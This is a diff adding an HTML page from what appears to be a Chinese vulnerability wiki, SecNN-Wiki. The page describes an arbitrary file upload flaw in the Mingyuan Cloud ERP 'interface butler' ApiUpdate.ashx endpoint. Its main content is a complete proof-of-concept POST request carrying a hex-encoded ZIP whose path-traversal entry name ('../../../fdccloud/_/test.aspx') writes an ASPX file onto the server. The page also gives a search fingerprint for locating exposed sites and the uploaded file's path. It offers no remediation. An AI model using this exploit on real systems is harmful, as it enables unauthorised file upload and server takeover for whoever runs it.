@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%98%8E%E6%BA%90%E4%BA%91/%E6%98%8E%E6%BA%90%E4%BA%91%20ERP%E7%B3%BB%E7%BB%9F%20%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6%20ApiUpdate.ashx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u660e\u6e90\u4e91 ERP\u7cfb\u7edf \u63a5\u53e3\u7ba1\u5bb6 ApiUpdate.ashx \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%98%8E%E6%BA%90%E4%BA%91ERP%E6%8E%A5%E5%8F%A3ApiUpdate.ashx%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%98%8E%E6%BA%90%E4%BA%91ERP%E6%8E%A5%E5%8F%A3ApiUpdate.ashx%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        明源云ERP接口ApiUpdate.ashx文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9CVOS3000%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9CVOS3000%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        昆石网络VOS3000任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="erp-apiupdateashx">明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞<a class="headerlink" href="#erp-apiupdateashx" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>明源云 ERP系统接口管家 ApiUpdate.ashx 文件存在任意文件上传漏洞，攻击者通过构造特殊的ZIP压缩包可以上传任意文件，控制服务器</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>明源云 ERP系统接口管家</a-checkbox></br></p>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>"接口管家站点正常！"</a-checkbox></br></p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登录页面</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1662522673554-08514e40-82db-42e2-8a4a-ee04e3b55404.png" /></p>
+<p>漏洞存在于某端口下的接口管家服务</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1691996151207-69a0200e-d9a7-4d60-b390-e1c9a22edc6c.png" /></p>
+<p>验证POC</p>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> 
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">856</span>
+
+{{hexdec(504B030414000000080063740E576AE37B2383000000940000001D0000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E6173707825CC490AC2401404D0BDA7685A02C9A62F90288A22041C42E2B0FE4A11033DD983E0EDFDE2AEA8575453AC444723C49EEC98392CE4662E45B16C185AE35D48E24806D1D3836DF8C404A3DAD37F227A066723D42D4C09A53C23A66BD65656F56ED2505B68703F20BC11D4817C47E959F678651EAA4BD06A7D8F4EE7841F5455CDB7B32F504B0102140314000000080063740E576AE37B2383000000940000001D00000000000000000000008001000000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E61737078504B050600000000010001004B000000BE0000000000)}}
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/1691996174406-479b4fcb-a1ee-42a0-9228-6df077c3bd15.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="err">/fdccloud/_/test.aspx</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%98%8E%E6%BA%90%E4%BA%91ERP%E6%8E%A5%E5%8F%A3ApiUpdate.ashx%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%98%8E%E6%BA%90%E4%BA%91ERP%E6%8E%A5%E5%8F%A3ApiUpdate.ashx%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        明源云ERP接口ApiUpdate.ashx文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9CVOS3000%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9CVOS3000%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        昆石网络VOS3000任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
